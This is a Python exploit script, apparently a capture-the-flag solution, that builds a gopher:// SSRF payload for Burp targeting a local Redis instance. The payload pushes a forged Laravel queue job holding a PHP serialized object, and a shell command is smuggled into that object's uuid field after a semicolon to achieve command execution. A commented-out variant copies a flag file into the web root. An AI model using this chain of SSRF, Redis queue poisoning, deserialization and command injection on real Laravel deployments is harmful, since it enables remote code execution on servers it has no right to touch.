#!/usr/bin/python3.11

import urllib.parse
import json

# ===[ Command to Inject ]===
# command = "cat /flag >> /www/public/fuck"
command = "echo pwn > /tmp/injection"
uuid_value = f"09da39b3-ec27-4a2e-b9bd-1d9e3a6fe220;{command}"
uuid_len = len(uuid_value)

# ===[ PHP Serialized Payload with escaped literal braces ]===
php_serialized = (
    'O:15:\\"App\\\\Jobs\\\\rmFile\\":1:{{'
    's:9:\\"fileQueue\\";O:21:\\"App\\\\Message\\\\FileQueue\\":3:{{'
    's:8:\\"filePath\\";s:45:\\"/src/a39b3cf4-dc8e-4213-b766-5210456b11fd.txt\\";'
    's:4:\\"uuid\\";s:{uuid_len}:\\"{uuid_value}\\";'
    's:3:\\"ext\\";s:3:\\"txt\\";}}}}'
).format(uuid_len=uuid_len, uuid_value=uuid_value)

# ===[ Laravel Job JSON Payload — braces escaped ]===
job_json_template = (
    '{{"uuid":"3c630268-4150-4420-a2a2-fb13b7f56bdd",'
    '"displayName":"App\\\\Jobs\\\\rmFile",'
    '"job":"Illuminate\\\\Queue\\\\CallQueuedHandler@call",'
    '"maxTries":null,'
    '"maxExceptions":null,'
    '"failOnTimeout":false,'
    '"backoff":null,'
    '"timeout":null,'
    '"retryUntil":null,'
    '"data":{{"commandName":"App\\\\Jobs\\\\rmFile","command":"{}"}},'
    '"id":"pEvA4CmFz5wFIOttgLmrCWeavOhyviVz",'
    '"attempts":0}}'
)
job_json = job_json_template.format(php_serialized)

# ===[ RESP Format for Redis LPUSH ]===
key = "laravel_database_queues:default"
resp = (
    f"*3\r\n"
    f"${len('LPUSH')}\r\nLPUSH\r\n"
    f"${len(key)}\r\n{key}\r\n"
    f"${len(job_json)}\r\n{job_json}\r\n"
)

# ===[ Gopher Encoding ]===
encoded = urllib.parse.quote(resp)

# ===[ Wrap in JSON for Burp ]===
payload = {
    "site": f"gopher://127-0-0-1.nip.io:6379/_{encoded}"
}

# ===[ Output the Final Payload ]===
print(json.dumps(payload, indent=2))
